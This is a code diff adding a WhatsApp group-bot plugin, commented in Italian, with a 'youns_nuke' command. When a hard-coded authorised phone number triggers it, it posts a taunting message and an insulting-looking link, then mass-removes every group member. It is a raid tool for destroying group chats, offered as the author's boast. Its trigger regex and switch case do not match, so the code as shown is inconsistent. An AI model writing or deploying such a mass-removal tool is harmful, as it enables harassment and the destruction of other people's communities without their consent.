@@ -1,0 +1,40 @@
+// Hey hey guarda la come ti diverti a guardare la mia creazione 🤓
+let handler = async (m, { conn, args, groupMetadata, participants, usedPrefix, command, isBotAdmin, isSuperAdmin }) => {
+    const allowedNumber = "393335608801@s.whatsapp.net"; // Numero autorizzato
+    if (m.sender !== allowedNumber) {
+        return await conn.sendMessage(m.chat, { text: "❌ Non sei autorizzato a usare questo comando. Solo Youns e Svo possono" });
+    }
+
+    let ps = participants.map(u => u.id).filter(v => v !== conn.user.jid);
+    let bot = global.db.data.settings[conn.user.jid] || {};
+    if (ps == '') return;
+    const delay = time => new Promise(res => setTimeout(res, time));
+
+    switch (command) {
+        case "youns_nuke":  
+            if (!bot.restrict) return;
+            if (!isBotAdmin) return;
+
+            // Invio del messaggio decorato
+            await conn.sendMessage(m.chat, { text: "✧･ﾟ: ✧･ﾟ: A͛V͛E͛T͛E͛ L͛'͛O͛N͛O͛R͛E͛ D͛I͛ E͛S͛S͛E͛R͛E͛ S͛V͛T͛ D͛A͛L͛ S͛O͛L͛O͛ E͛ U͛N͛I͛C͛O͛ ✧ Ɏ๏ᑘƞร ✧･ﾟ: ✧･ﾟ:" });
+
+            // Invio del link
+           await conn.sendMessage(m.chat, { text: 'ENTRATE TUTTI QUA:\nlinaseiunacogliona.com' });
+
+            let users = participants.map(u => u.id).filter(v => v !== conn.user.jid);   
+
+            if (isBotAdmin && bot.restrict) { 
+                await delay(10);
+                let responseb = await conn.groupParticipantsUpdate(m.chat, users, 'remove');
+                if (responseb[0].status === "404") 
+                    await delay(1);
+            } else return;
+            break;           
+    }
+};
+
+handler.command = /^(301107)$/i;
+handler.group = true;
+handler.fail = null;
+
+export default handler;
